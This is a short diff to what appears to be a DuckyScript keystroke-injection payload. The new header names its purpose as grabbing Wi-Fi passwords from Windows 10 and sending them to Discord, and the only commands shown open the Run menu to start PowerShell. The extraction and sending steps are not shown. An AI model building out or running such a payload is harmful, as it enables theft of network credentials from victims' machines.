@@ -1,5 +1,13 @@
-REM Github.com/Murdervan
-REM Windows 10 Only
+REM ###########################################################
+REM #                                                         #
+REM # Title        : Grabbing wifi password to discord        #
+REM # Author       : Murdervan                                #
+REM # Link         : github.com/murdervan                     #
+REM # Target       : Windows 10                               #
+REM #                                                         #
+REM ###########################################################
+
+
 REM Opening powershell from the run menu
     GUI r
     DELAY 500
